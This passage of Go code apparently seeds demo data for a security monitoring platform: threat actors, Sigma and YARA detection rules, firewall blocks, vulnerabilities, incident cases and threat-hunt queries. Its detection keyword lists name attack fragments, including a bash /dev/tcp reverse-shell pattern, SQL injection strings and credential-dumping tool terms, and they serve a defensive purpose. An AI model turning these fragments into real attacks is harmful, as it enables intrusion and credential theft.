			[]string{"T1486", "T1059.003", "T1566.001", "T1105"},
		},
		{
			"BlackCat / ALPHV", "Unknown", "financial", "high",
			"Ransomware-as-a-service (RaaS) group using Rust-based encryptor. Targets critical infrastructure.",
			[]string{"ALPHV", "Noberus"},
			[]string{"healthcare", "critical_infrastructure", "manufacturing"},
			[]string{"T1486", "T1490", "T1082", "T1083"},
		},
	}
	for _, a := range actors {
		aliases := fmt.Sprintf(`{"%s"}`, joinStr(a.aliases, `","`))
		sectors := fmt.Sprintf(`{"%s"}`, joinStr(a.sectors, `","`))
		techniques := fmt.Sprintf(`{"%s"}`, joinStr(a.techniques, `","`))
		mustExec(db, `
			INSERT INTO threat_actors
				(name, aliases, origin_country, motivation, sophistication, description, targeted_sectors, mitre_techniques, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,9999)
			ON CONFLICT DO NOTHING`,
			a.name, aliases, a.country, a.motivation, a.sophistication, a.desc, sectors, techniques,
		)
	}
}

func joinStr(s []string, sep string) string {
	result := ""
	for i, v := range s {
		if i > 0 {
			result += sep
		}
		result += v
	}
	return result
}

func seedSigmaRules(db *sql.DB) {
	rules := []struct {
		title, severity, tactic, technique, mitreN, logsrc, desc string
		keywords                                                  []string
	}{
		{"Mimikatz LSASS Dump", "critical", "Credential Access", "T1003.001", "OS Credential Dumping: LSASS Memory", "process", "Detects mimikatz credential dump via LSASS access", []string{"mimikatz", "sekurlsa", "lsass"}},
		{"PowerShell Base64 Encoded Command", "high", "Execution", "T1059.001", "PowerShell", "process", "Detects PowerShell running base64 encoded payloads", []string{"-EncodedCommand", "-enc", "powershell"}},
		{"Cobalt Strike Beacon Pattern", "critical", "Command and Control", "T1071.001", "Application Layer Protocol: Web Protocols", "network", "Detects Cobalt Strike malleable C2 beacon patterns", []string{"jitter", "x64/meterpreter", "msf"}},
		{"Scheduled Task Persistence", "medium", "Persistence", "T1053.005", "Scheduled Task/Job: Scheduled Task", "process", "Detects suspicious scheduled task creation for persistence", []string{"schtasks", "/create", "/sc", "startup"}},
		{"Windows Defender Disable via Registry", "high", "Defense Evasion", "T1562.001", "Disable or Modify Tools", "registry", "Detects disabling of Windows Defender via registry modification", []string{"DisableRealtimeMonitoring", "Windows Defender"}},
		{"Ransomware File Extension Rename", "critical", "Impact", "T1486", "Data Encrypted for Impact", "file", "Detects mass file renaming with encrypted extensions", []string{".encrypted", ".locked", ".crypted", ".enc"}},
		{"DNS Tunneling via Long TXT Queries", "high", "Command and Control", "T1071.004", "Application Layer Protocol: DNS", "dns", "Detects DNS tunneling using unusually long TXT record queries", []string{"TXT", "evil-domain", "iodine"}},
		{"Pass-the-Hash NTLM Authentication", "high", "Lateral Movement", "T1550.002", "Use Alternate Authentication Material: Pass the Hash", "network", "Detects NTLM pass-the-hash lateral movement", []string{"NTLM", "NTHash", "hash reuse"}},
		{"Suspicious Cron Job Creation", "medium", "Persistence", "T1053.003", "Scheduled Task/Job: Cron", "process", "Detects cron job creation in suspicious directories", []string{"/tmp/", ".hidden", "crontab", "*/5"}},
		{"SUID Binary Modification", "high", "Privilege Escalation", "T1548.001", "Abuse Elevation Control: Setuid/Setgid", "file", "Detects SUID bit being set on non-standard binaries", []string{"chmod +s", "chmod 4755", "setuid"}},
		{"Event Log Cleared", "high", "Defense Evasion", "T1070.001", "Indicator Removal: Clear Windows Event Logs", "event", "Detects clearing of Windows Security event logs", []string{"Event ID 1102", "Security log cleared", "EvtClearLog"}},
		{"Reverse Shell via Bash", "critical", "Execution", "T1059.004", "Unix Shell", "process", "Detects reverse shell using bash /dev/tcp technique", []string{"bash -i", "/dev/tcp", ">&", "0>&1"}},
		{"Android USB Debugging Enabled", "medium", "Defense Evasion", "T1562", "Impair Defenses", "android", "Detects USB debugging mode enabled on Android devices", []string{"adb", "USB debugging", "developer mode"}},
		{"Kernel Module Load — Unsigned", "critical", "Persistence", "T1547.006", "Kernel Modules and Extensions", "kernel", "Detects loading of unsigned or suspicious kernel modules", []string{"insmod", "modprobe", ".ko", "rootkit"}},
		{"SQL Injection in HTTP POST", "high", "Initial Access", "T1190", "Exploit Public-Facing Application", "web", "Detects SQL injection patterns in HTTP POST body", []string{"' OR '1'='1", "UNION SELECT", "--", "xp_cmdshell"}},
		{"Office Macro Execution via Word", "high", "Execution", "T1204.002", "User Execution: Malicious File", "process", "Detects cmd.exe or PowerShell spawned by Word macros", []string{"winword.exe", "cmd.exe", "powershell.exe", "macro"}},
		{"Impossible Travel Login", "medium", "Initial Access", "T1078", "Valid Accounts", "auth", "Detects login from geographically impossible location", []string{"impossible travel", "geo anomaly", "location change"}},
		{"JA3 Fingerprint Malware Match", "high", "Command and Control", "T1071", "Application Layer Protocol", "network", "Detects TLS connections matching known malware JA3 fingerprints", []string{"JA3", "Metasploit", "CobaltStrike", "769,47-53"}},
		{"Suspicious Data Exfiltration Volume", "high", "Exfiltration", "T1048", "Exfiltration Over Alternative Protocol", "network", "Detects large data transfers to external IPs", []string{"15 MB", "exfil", "HTTPS upload", "large transfer"}},
		{"Android Rooting Tool Detected", "high", "Defense Evasion", "T1562", "Impair Defenses", "android", "Detects Magisk or SuperSU presence indicating device rooting", []string{"Magisk", "SuperSU", "/dev/.magisk", "root"}},
	}
	for _, r := range rules {
		kwJSON := `["` + joinStr(r.keywords, `","`) + `"]`
		mustExec(db, `
			INSERT INTO sigma_rules
				(title, severity, mitre_tactic, mitre_technique, mitre_name, logsource_cat, description, keywords, enabled, status, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8::jsonb,true,'stable',9999)
			ON CONFLICT DO NOTHING`,
			r.title, r.severity, r.tactic, r.technique, r.mitreN, r.logsrc, r.desc, kwJSON,
		)
	}
}

func seedYaraRules(db *sql.DB, agentIDs []int) {
	rules := []struct {
		name, desc, content string
	}{
		{
			"Cobalt_Strike_Beacon",
			"Detects Cobalt Strike beacon binary patterns",
			`rule Cobalt_Strike_Beacon {
  meta:
    description = "Detects Cobalt Strike beacon"
    author = "XCloak Threat Intel"
    severity = "critical"
  strings:
    $cs1 = "MZ" nocase
    $cs2 = { 4D 5A 90 00 03 00 00 00 }
    $jitter = "sleep_mask" nocase
    $pipe = "\\\\.\\pipe\\msagent_" wide
  condition:
    $cs1 at 0 and ($jitter or $pipe)
}`,
		},
		{
			"Mimikatz_Generic",
			"Detects Mimikatz credential dump tool variants",
			`rule Mimikatz_Generic {
  meta:
    description = "Detects Mimikatz variants"
    severity = "critical"
  strings:
    $s1 = "sekurlsa" nocase
    $s2 = "lsadump" nocase
    $s3 = "mimikatz" nocase
    $s4 = "privilege::debug" nocase
  condition:
    2 of them
}`,
		},
		{
			"BlackCat_Ransomware",
			"Detects BlackCat/ALPHV ransomware encryptor",
			`rule BlackCat_Ransomware {
  meta:
    description = "Detects BlackCat/ALPHV ransomware"
    severity = "critical"
  strings:
    $enc1 = ".encrypted" wide
    $note = "RECOVER-" wide
    $rust = "ALPHV_BLACKCAT" nocase
  condition:
    2 of them
}`,
		},
	}
	var ruleIDs []int
	for _, r := range rules {
		var id int
		err := db.QueryRow(`
			INSERT INTO yara_rules (name, description, rule_content, enabled, tenant_id)
			VALUES ($1,$2,$3,true,9999)
			ON CONFLICT DO NOTHING
			RETURNING id`,
			r.name, r.desc, r.content,
		).Scan(&id)
		if err == nil {
			ruleIDs = append(ruleIDs, id)
		}
	}

	if len(ruleIDs) == 0 || len(agentIDs) == 0 {
		return
	}
	matches := []struct {
		agentIdx  int
		ruleIdx   int
		path      string
		hash      string
		minsAgo   int
	}{
		{0, 0, "/tmp/.hidden/beacon", "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f", 240},
		{2, 1, "C:\\Windows\\Temp\\mimikatz.exe", "44d88612fea8a8f36de82e1278abb02f", 43},
		{1, 2, "/var/data/.enc_agent", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", 480},
	}
	for _, m := range matches {
		agentID := agentIDs[m.agentIdx%len(agentIDs)]
		ruleName := rules[m.ruleIdx%len(rules)].name
		mustExec(db, `
			INSERT INTO yara_matches
				(agent_id, file_path, rule_name, severity, description, file_hash, matched_strings, tenant_id)
			VALUES ($1,$2,$3,'critical','YARA rule matched malware signature',$4,'["$s1","$s2"]',9999)`,
			agentID, m.path, ruleName, m.hash,
		)
	}
}

func seedFirewallRules(db *sql.DB) {
	rules := []struct {
		name, src, dst, proto, action, desc, group string
		port, priority                              int
	}{
		{"Block Cobalt Strike C2", "0.0.0.0/0", "185.220.101.47", "tcp", "drop", "Auto-blocked C2 IP from IOC feed", "IOC Blocks", 443, 1},
		{"Block Known Exfil Server", "10.0.0.0/8", "94.102.49.190", "tcp", "drop", "Outbound exfiltration staging server", "IOC Blocks", 443, 2},
		{"Block Brute Force Source", "0.0.0.0/0", "45.33.32.156", "tcp", "drop", "SSH brute force — 42 failed attempts", "Threat Blocks", 22, 3},
		{"Allow Web Traffic", "10.0.0.0/8", "0.0.0.0/0", "tcp", "accept", "Permit internal web traffic", "Base Policy", 80, 100},
		{"Allow HTTPS", "10.0.0.0/8", "0.0.0.0/0", "tcp", "accept", "Permit internal HTTPS traffic", "Base Policy", 443, 101},
		{"Allow DNS Internal", "10.0.0.0/8", "10.0.1.1", "udp", "accept", "Internal DNS resolution only", "Base Policy", 53, 102},
		{"Block Telnet", "0.0.0.0/0", "0.0.0.0/0", "tcp", "drop", "Telnet is prohibited — use SSH", "Hardening", 23, 10},
		{"Block RDP from Internet", "0.0.0.0/0", "10.0.0.0/8", "tcp", "drop", "No direct RDP from external networks", "Hardening", 3389, 11},
		{"Allow SSH from Bastion", "10.0.1.5", "10.0.0.0/8", "tcp", "accept", "SSH access only from bastion host", "Base Policy", 22, 50},
		{"Log All Outbound Denied", "10.0.0.0/8", "0.0.0.0/0", "any", "log", "Log all denied outbound connections", "Audit", 0, 999},
	}
	for _, r := range rules {
		mustExec(db, `
			INSERT INTO firewall_rules
				(name, source_ip, destination_ip, protocol, port, action, enabled, priority, description, group_name, hit_count, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,true,$7,$8,$9,$10,9999)
			ON CONFLICT DO NOTHING`,
			r.name, r.src, r.dst, r.proto, r.port, r.action, r.priority, r.desc, r.group, 0,
		)
	}
	// update hit counts realistically
	mustExec(db, `UPDATE firewall_rules SET hit_count=14832 WHERE name='Block Cobalt Strike C2' AND tenant_id=9999`)
	mustExec(db, `UPDATE firewall_rules SET hit_count=2341 WHERE name='Block Known Exfil Server' AND tenant_id=9999`)
	mustExec(db, `UPDATE firewall_rules SET hit_count=88203 WHERE name='Allow HTTPS' AND tenant_id=9999`)
}

func seedVulnerabilities(db *sql.DB, agentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	now := time.Now()
	vulns := []struct {
		agentIdx    int
		pkg         string
		version     string
		cve         string
		severity    string
		cvss        float64
		desc        string
		remediation string
		isKEV       bool
		patchStatus string
		daysAgo     int
	}{
		{0, "openssl", "1.1.1t", "CVE-2024-0727", "high", 7.5, "OpenSSL denial-of-service via malformed PKCS12 file", "Upgrade to openssl >= 3.0.8", false, "open", 45},
		{0, "nginx", "1.18.0", "CVE-2024-7347", "medium", 5.3, "nginx HTTP/3 parsing error allowing memory leak", "Upgrade to nginx >= 1.27.0", false, "open", 12},
		{1, "mysql-server", "8.0.32", "CVE-2024-21096", "high", 8.2, "MySQL privilege escalation via mysqldump", "Upgrade to mysql >= 8.0.37", false, "in_progress", 30},
		{1, "linux-kernel", "5.15.0", "CVE-2024-1086", "critical", 9.8, "Linux kernel use-after-free in netfilter — local privilege escalation", "Apply kernel patch 5.15.149+", true, "open", 60},
		{2, "windows-kernel", "10.0.19041", "CVE-2024-30051", "critical", 9.8, "Windows DWM Core Library privilege escalation — in wild exploitation", "Apply KB5039299 (June 2026 Patch Tuesday)", true, "open", 20},
		{2, "microsoft-office", "16.0.14326", "CVE-2024-30103", "high", 8.8, "Microsoft Outlook RCE via malformed email attachment", "Update to Office 365 build 16827+", true, "in_progress", 15},
		{0, "sudo", "1.9.5p2", "CVE-2023-42465", "high", 7.0, "Sudo rowhammer privilege escalation", "Upgrade sudo >= 1.9.15", false, "open", 90},
		{1, "log4j", "2.14.1", "CVE-2021-44228", "critical", 10.0, "Log4Shell — JNDI remote code execution in logging framework", "Upgrade to log4j >= 2.17.1 immediately", true, "open", 180},
		{3, "android-webkit", "109.0", "CVE-2024-5274", "critical", 8.8, "Chrome/WebKit type confusion — in active exploitation", "Update Android Chrome/WebView", true, "open", 25},
		{0, "openssh", "8.9p1", "CVE-2024-6387", "critical", 8.1, "OpenSSH regreSSHion — unauthenticated RCE in signal handler race", "Upgrade openssh >= 9.8p1", true, "open", 10},
	}
	for _, v := range vulns {
		agentID := agentIDs[v.agentIdx%len(agentIDs)]
		mustExec(db, `
			INSERT INTO vulnerabilities
				(agent_id, package_name, package_version, cve_id, severity, cvss_score, description, remediation, is_kev, patch_status, detected_at, name, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,9999)`,
			agentID, v.pkg, v.version, v.cve, v.severity, v.cvss, v.desc, v.remediation, v.isKEV, v.patchStatus,
			now.Add(-time.Duration(v.daysAgo)*24*time.Hour),
			v.cve+" "+v.pkg,
		)
	}
}

func seedAssets(db *sql.DB, agentIDs []int) {
	assets := []struct {
		agentIdx    int
		name        string
		hostname    string
		ip          string
		assetType   string
		owner       string
		bunit       string
		criticality string
		dataClass   string
		env         string
		loc         string
	}{
		{0, "Web Production Server", "web-prod-01", "10.0.1.10", "server", "DevOps Team", "Engineering", "critical", "public", "production", "us-east-1"},
		{1, "Database Server", "db-server-02", "10.0.1.20", "database", "Data Engineering", "Engineering", "critical", "confidential", "production", "us-east-1"},
		{2, "Engineering Workstation", "win-workstation-05", "10.0.2.55", "workstation", "User: jdoe", "Engineering", "high", "internal", "production", "HQ-NYC"},
		{3, "Mobile Device — Android", "android-mobile-01", "192.168.1.88", "mobile", "User: asmith", "Sales", "medium", "internal", "production", "Remote"},
		{-1, "Domain Controller", "dc-01", "10.0.1.5", "server", "IT Admin", "IT", "critical", "confidential", "production", "us-east-1"},
		{-1, "Jump Box / Bastion", "bastion-01", "10.0.1.2", "server", "IT Admin", "IT", "high", "internal", "production", "us-east-1"},
		{-1, "SIEM / XCloak Host", "siem-01", "10.0.1.100", "server", "Security Team", "Security", "critical", "confidential", "production", "us-east-1"},
	}
	for _, a := range assets {
		var agentID *int
		if a.agentIdx >= 0 && a.agentIdx < len(agentIDs) {
			id := agentIDs[a.agentIdx]
			agentID = &id
		}
		mustExec(db, `
			INSERT INTO assets
				(name, hostname, ip_address, asset_type, owner, business_unit, criticality, data_classification, environment, location, agent_id, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,9999)
			ON CONFLICT DO NOTHING`,
			a.name, a.hostname, a.ip, a.assetType, a.owner, a.bunit, a.criticality, a.dataClass, a.env, a.loc, agentID,
		)
	}
}

func seedCases(db *sql.DB, alertIDs, incidentIDs []int) {
	now := time.Now()
	cases := []struct {
		title, desc, severity, status, phase, mitreTactic, mitreTechnique string
		slaHours                                                            int
		hoursAgo                                                            int
	}{
		{
			"C2 Implant Investigation — web-prod-01", "Active Cobalt Strike beacon detected on web-prod-01. Memory acquisition triggered. Isolating host and hunting for lateral movement.",
			"critical", "open", "containment", "Command and Control", "T1071.001", 4, 1,
		},
		{
			"Credential Theft + Lateral Movement", "mimikatz run on win-workstation-05 extracted NTLM hashes. Pass-the-hash attempt to dc-01 confirmed. AD accounts locked.",
			"high", "investigating", "eradication", "Credential Access", "T1003.001", 8, 3,
		},
		{
			"Ransomware Post-Incident Review", "BlackCat/ALPHV contained. 847 files encrypted on db-server-02. Restoring from backup. CVE-2024-1086 patched.",
			"critical", "resolved", "lessons_learned", "Impact", "T1486", 24, 10,
		},
	}
	for i, c := range cases {
		var caseID int
		err := db.QueryRow(`
			INSERT INTO cases
				(title, description, severity, status, phase, mitre_tactic, mitre_technique, sla_hours, created_at, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,9999)
			RETURNING id`,
			c.title, c.desc, c.severity, c.status, c.phase, c.mitreTactic, c.mitreTechnique, c.slaHours,
			now.Add(-time.Duration(c.hoursAgo)*time.Hour),
		).Scan(&caseID)
		if err != nil {
			log.Printf("case: %v", err)
			continue
		}
		// Link alert to case
		if i < len(alertIDs) {
			mustExec(db, `INSERT INTO case_alerts (case_id, alert_id) VALUES ($1,$2) ON CONFLICT DO NOTHING`, caseID, alertIDs[i])
		}
	}
}

func seedSuppressionRules(db *sql.DB) {
	rules := []struct {
		name, desc, ruleName, severity, technique string
		windowMins                                 int
	}{
		{"Suppress Low USB Noise", "Suppress low severity USB debugging alerts from Android test devices", "USB Debugging Enabled", "low", "T1562", 1440},
		{"Suppress TLS Negotiation Warnings", "Suppress TLS 1.0 warnings from legacy monitoring systems", "Weak TLS Negotiated", "low", "T1573", 720},
		{"Suppress Resolved Ransomware Alerts", "Ransomware incident resolved — suppress duplicate detection noise", "Ransomware File Pattern", "critical", "T1486", 10080},
	}
	for _, r := range rules {
		mustExec(db, `
			INSERT INTO suppression_rules
				(name, description, rule_name, severity, mitre_technique, window_minutes, enabled, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,true,9999)
			ON CONFLICT DO NOTHING`,
			r.name, r.desc, r.ruleName, r.severity, r.technique, r.windowMins,
		)
	}
}

func seedQuarantine(db *sql.DB, agentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	files := []struct {
		agentIdx       int
		originalPath   string
		quarantinePath string
		fileName       string
		reason         string
	}{
		{0, "/tmp/.hidden/beacon", "/var/xcloak/quarantine/beacon_20260708_c2", "beacon", "Cobalt Strike beacon binary — YARA match: Cobalt_Strike_Beacon"},
		{2, "C:\\Windows\\Temp\\mimikatz.exe", "C:\\xcloak\\quarantine\\mimikatz_20260708", "mimikatz.exe", "Credential theft tool — YARA match: Mimikatz_Generic"},
		{1, "/var/data/.enc_agent", "/var/xcloak/quarantine/enc_agent_20260708", ".enc_agent", "BlackCat ransomware encryptor — YARA match: BlackCat_Ransomware"},
		{3, "/data/app/com.hacker.spyware.apk", "/var/xcloak/quarantine/spyware_20260708.apk", "com.hacker.spyware.apk", "Android spyware — IOC match: com.hacker.spyware"},
	}
	for _, f := range files {
		agentID := agentIDs[f.agentIdx%len(agentIDs)]
		mustExec(db, `
			INSERT INTO quarantined_files
				(agent_id, original_path, quarantine_path, file_name, reason, tenant_id)
			VALUES ($1,$2,$3,$4,$5,9999)`,
			agentID, f.originalPath, f.quarantinePath, f.fileName, f.reason,
		)
	}
}

func seedNetworkAnomalies(db *sql.DB, agentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	now := time.Now()
	anomalies := []struct {
		agentIdx     int
		anomalyType  string
		dstIP        string
		dstPort      int
		proto        string
		score        int
		desc         string
		minsAgo      int
	}{
		{0, "beacon", "185.220.101.47", 443, "tcp", 98, "Periodic HTTPS beacon every 60s — Cobalt Strike jitter profile", 25},
		{0, "exfil", "94.102.49.190", 443, "tcp", 87, "Large data transfer 15 MB outbound — potential exfiltration", 31},
		{2, "lateral_move", "10.0.1.5", 445, "tcp", 82, "SMB connection from workstation to DC — pass-the-hash movement", 120},
		{0, "dns_tunnel", "8.8.8.8", 53, "udp", 76, "Abnormal DNS TXT query volume to evil-domain.xyz — iodine profile", 140},
		{1, "port_scan", "10.0.0.0", 0, "tcp", 70, "Internal port scan originating from db-server-02", 200},
		{3, "c2", "203.0.113.42", 8080, "tcp", 65, "Android device contacting suspicious IP on non-standard port", 380},
	}
	for _, a := range anomalies {
		agentID := agentIDs[a.agentIdx%len(agentIDs)]
		mustExec(db, `
			INSERT INTO network_anomalies
				(agent_id, tenant_id, anomaly_type, dst_ip, dst_port, proto, deviation_score, description, detected_at)
			VALUES ($1,9999,$2,$3,$4,$5,$6,$7,$8)`,
			agentID, a.anomalyType, a.dstIP, a.dstPort, a.proto, a.score, a.desc,
			now.Add(-time.Duration(a.minsAgo)*time.Minute),
		)
	}
}

func seedUEBA(db *sql.DB, agentIDs []int) {
	now := time.Now()
	events := []struct {
		username    string
		eventType   string
		severity    string
		desc        string
		sourceIP    string
		agentIdx    int
		minsAgo     int
	}{
		{"jdoe", "impossible_travel", "high", "Login from Lagos, Nigeria — user's last login was New York 30 min earlier", "41.184.102.17", 2, 300},
		{"admin", "privilege_escalation", "critical", "Admin account ran mimikatz — credentials likely compromised", "10.0.2.55", 2, 43},
		{"asmith", "off_hours_access", "medium", "User accessed sensitive DB at 03:22 UTC — 4 hours outside normal pattern", "192.168.1.88", 3, 200},
		{"jdoe", "large_download", "high", "15 GB downloaded from internal file server in 2 hours — 8x above baseline", "10.0.2.55", 2, 180},
		{"svc_backdoor", "new_account_activity", "critical", "New service account created and used for network scanning within 5 minutes", "10.0.1.10", 0, 45},
		{"admin", "failed_logins", "medium", "42 failed SSH attempts in 60 seconds from 45.33.32.156", "45.33.32.156", 0, 90},
		{"jdoe", "sensitive_file_access", "high", "Accessed /etc/shadow and /etc/passwd — credential file enumeration", "10.0.2.55", 2, 168},
	}
	for _, e := range events {
		var agentID *int
		if e.agentIdx < len(agentIDs) {
			id := agentIDs[e.agentIdx]
			agentID = &id
		}
		mustExec(db, `
			INSERT INTO ueba_events
				(tenant_id, username, event_type, severity, description, source_ip, agent_id, detected_at)
			VALUES (9999,$1,$2,$3,$4,$5,$6,$7)`,
			e.username, e.eventType, e.severity, e.desc, e.sourceIP, agentID,
			now.Add(-time.Duration(e.minsAgo)*time.Minute),
		)
	}

	users := []struct {
		username    string
		riskScore   int
		totalEvents int
		failedLogins int
		offHours    int
		uniqueIPs   int
		privEsc     int
		flags       []string
		lastIP      string
	}{
		{"admin", 89, 142, 42, 3, 5, 2, []string{"compromised_credential", "lateral_movement"}, "10.0.2.55"},
		{"jdoe", 72, 87, 2, 5, 12, 0, []string{"impossible_travel", "large_download"}, "41.184.102.17"},
		{"asmith", 45, 34, 1, 8, 3, 0, []string{"off_hours_access"}, "192.168.1.88"},
		{"svc_backdoor", 95, 28, 0, 0, 2, 1, []string{"new_account", "scanning"}, "10.0.1.10"},
	}
	for _, u := range users {
		mustExec(db, `
			INSERT INTO user_risk_profiles
				(tenant_id, username, risk_score, total_events, failed_logins, off_hours_events, unique_ips, privilege_escalations, flags, last_seen_ip, last_event_at, analyzed_at)
			VALUES (9999,$1,$2,$3,$4,$5,$6,$7,$8,$9,now()-interval '30 minutes',now())
			ON CONFLICT DO NOTHING`,
			u.username, u.riskScore, u.totalEvents, u.failedLogins, u.offHours, u.uniqueIPs, u.privEsc,
			pq.Array(u.flags), u.lastIP,
		)
	}
}

func seedInsiderThreat(db *sql.DB) {
	now := time.Now()
	scores := []struct {
		username    string
		score       int
		riskLevel   string
		alertFired  bool
	}{
		{"jdoe", 72, "high", true},
		{"asmith", 45, "medium", false},
		{"admin", 89, "critical", true},
		{"svc_backdoor", 95, "critical", true},
		{"bwilson", 18, "low", false},
		{"cjohnson", 31, "low", false},
	}
	for _, s := range scores {
		contrib := fmt.Sprintf(`{"off_hours":%d,"failed_logins":%d,"data_access":%d}`,
			s.score/4, s.score/5, s.score/3)
		mustExec(db, `
			INSERT INTO insider_threat_scores
				(tenant_id, username, score, risk_level, contributors, alert_fired, score_date, created_at)
			VALUES (9999,$1,$2,$3,$4::jsonb,$5,$6,$7)
			ON CONFLICT DO NOTHING`,
			s.username, s.score, s.riskLevel, contrib, s.alertFired,
			now.AddDate(0, 0, 0).Format("2006-01-02"),
			now,
		)
	}
}

func seedAlertClusters(db *sql.DB, alertIDs []int) {
	clusters := []struct {
		clusterKey, technique, ruleName string
		alertCount                      int
		status                          string
	}{
		{"C2-T1071.001", "T1071.001", "C2 Beacon Detected", 3, "open"},
		{"CRED-T1003.001", "T1003.001", "Credential Dump — LSASS", 2, "investigating"},
		{"RANSOM-T1486", "T1486", "Ransomware File Pattern", 1, "suppressed"},
		{"PERSIST-T1053", "T1053.003", "Suspicious Cron Job", 4, "open"},
		{"LATERA-T1550.002", "T1550.002", "Pass-the-Hash Attempt", 2, "open"},
	}
	for i, c := range clusters {
		var clusterID int
		err := db.QueryRow(`
			INSERT INTO alert_clusters
				(tenant_id, cluster_key, mitre_technique, rule_name, alert_count, status, first_seen, last_seen)
			VALUES (9999,$1,$2,$3,$4,$5,now()-interval '6 hours',now())
			ON CONFLICT DO NOTHING
			RETURNING id`,
			c.clusterKey, c.technique, c.ruleName, c.alertCount, c.status,
		).Scan(&clusterID)
		if err != nil {
			continue
		}
		if i < len(alertIDs) {
			mustExec(db, `
				INSERT INTO alert_cluster_members (cluster_id, alert_id) VALUES ($1,$2) ON CONFLICT DO NOTHING`,
				clusterID, alertIDs[i],
			)
		}
	}
}

func seedJA3(db *sql.DB) {
	fps := []struct {
		hash, threatName, severity, source, desc string
	}{
		{"a0e9f5d64349fb13191bc781f81f42e1", "Cobalt Strike Default", "critical", "threatfox", "Default Cobalt Strike Malleable C2 JA3 hash (769 cipher suite)"},
		{"6734f37431670b3ab4292b8f60f29984", "Metasploit Meterpreter", "critical", "recorded_future", "Metasploit Meterpreter HTTPS stager JA3 fingerprint"},
		{"b386946a5a44d1ddcc843bc75336dfce", "Emotet C2", "high", "abuse_ch", "Emotet banking trojan C2 TLS fingerprint"},
		{"72a589da586844d7f0818ce684948eea", "QakBot", "high", "mandiant", "QakBot/QBot banking malware C2 JA3 fingerprint"},
	}
	for _, f := range fps {
		mustExec(db, `
			INSERT INTO ja3_fingerprints
				(hash, threat_name, severity, source, description, enabled, tenant_id)
			VALUES ($1,$2,$3,$4,$5,true,9999)
			ON CONFLICT DO NOTHING`,
			f.hash, f.threatName, f.severity, f.source, f.desc,
		)
	}
}

func seedCanary(db *sql.DB, agentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	now := time.Now()
	tokens := []struct {
		tokenType, name, tokenValue, desc, deployedTo string
		tripCount                                      int
	}{
		{"url", "AWS Credentials Doc", "xck-aws-creds-2026-demo", "Fake AWS credentials document placed in /etc/aws/credentials", "/etc/aws/credentials", 3},
		{"dns", "Internal API Spec DNS Token", "xck-api-spec-internal", "DNS canary token embedded in internal API documentation", "Confluence: API-INTERNAL-v2", 1},
		{"file", "Executive Salary Sheet", "xck-exec-salaries-xlsx", "Canary Excel file in Finance share — detects insider access", "\\\\fileserver\\Finance\\salaries.xlsx", 0},
		{"url", "Database Backup Link", "xck-db-backup-link", "Fake S3 backup link in database config file", "/etc/app/db.conf", 7},
	}
	var tokenIDs []int
	for _, t := range tokens {
		var id int
		err := db.QueryRow(`
			INSERT INTO canary_tokens
				(tenant_id, token_type, name, token_value, description, deployed_to, trip_count, alert_on_trip, is_active)
			VALUES (9999,$1,$2,$3,$4,$5,$6,true,true)
			ON CONFLICT DO NOTHING
			RETURNING id`,
			t.tokenType, t.name, t.tokenValue, t.desc, t.deployedTo, t.tripCount,
		).Scan(&id)
		if err == nil && t.tripCount > 0 {
			tokenIDs = append(tokenIDs, id)
		}
	}
	for i, tokenID := range tokenIDs {
		mustExec(db, `
			UPDATE canary_tokens SET last_tripped_at=$1 WHERE id=$2`,
			now.Add(-time.Duration(i+1)*2*time.Hour), tokenID,
		)
		mustExec(db, `
			INSERT INTO canary_trips
				(token_id, tenant_id, source_ip, user_agent, method, extra_data, tripped_at)
			VALUES ($1,9999,$2,'Mozilla/5.0 (Windows NT 10.0; Win64; x64)','GET','{}', $3)`,
			tokenID, "10.0.2.55", now.Add(-time.Duration(i+1)*2*time.Hour),
		)
	}
}

func seedHunt(db *sql.DB, agentIDs []int) {
	templates := []struct {
		name, desc, tactic, technique, query, schedule string
	}{
		{"C2 Beacon Detection Hunt", "Hunt for periodic outbound connections matching C2 beacon patterns", "Command and Control", "T1071.001", `source="network" | where bytes_out > 1000 AND connection_interval < 120 | stats count by remote_ip | where count > 10`, "@daily"},
		{"LSASS Memory Access Hunt", "Hunt for processes accessing LSASS memory outside of known security tools", "Credential Access", "T1003.001", `source="process" | where target_process="lsass.exe" AND NOT source_process IN ("svchost.exe","antivirus.exe") | table host,source_process,timestamp`, "@hourly"},
		{"Lateral Movement via SMB Hunt", "Detect SMB connections from workstations to servers outside business hours", "Lateral Movement", "T1021.002", `source="network" | where dst_port=445 AND src_type="workstation" AND hour(timestamp) NOT IN (8..18) | table src_ip,dst_ip,timestamp`, "@hourly"},
		{"PowerShell Encoded Command Hunt", "Hunt for base64-encoded PowerShell payloads across all endpoints", "Execution", "T1059.001", `source="process" | where process_name="powershell.exe" AND cmdline MATCHES "-[Ee][Nn][Cc]" | table host,cmdline,user,timestamp`, "@daily"},
		{"Persistence via Scheduled Tasks", "Detect newly created scheduled tasks with suspicious executables", "Persistence", "T1053.005", `source="event" | where event_id=4698 AND task_content MATCHES "(cmd.exe|powershell.exe|wscript.exe)" | table host,task_name,timestamp`, "@daily"},
	}
	var templateIDs []int
	for _, t := range templates {
		var id int
		err := db.QueryRow(`
			INSERT INTO hunt_templates
				(tenant_id, name, description, mitre_tactic, mitre_technique, kql_query, schedule, is_active, created_by)
			VALUES (9999,$1,$2,$3,$4,$5,$6,true,'demo-seeder')
			ON CONFLICT DO NOTHING
			RETURNING id`,
			t.name, t.desc, t.tactic, t.technique, t.query, t.schedule,
		).Scan(&id)
		if err == nil {
			templateIDs = append(templateIDs, id)
		}
	}

	runs := []struct {
		tmplIdx  int
		name     string
		status   string
		hitCount int
		analyst  string
		hoursAgo int
	}{
		{0, "C2 Hunt — July 8 2026", "completed", 14, "analyst-1", 2},
		{1, "LSASS Hunt — Daily", "completed", 3, "analyst-2", 6},
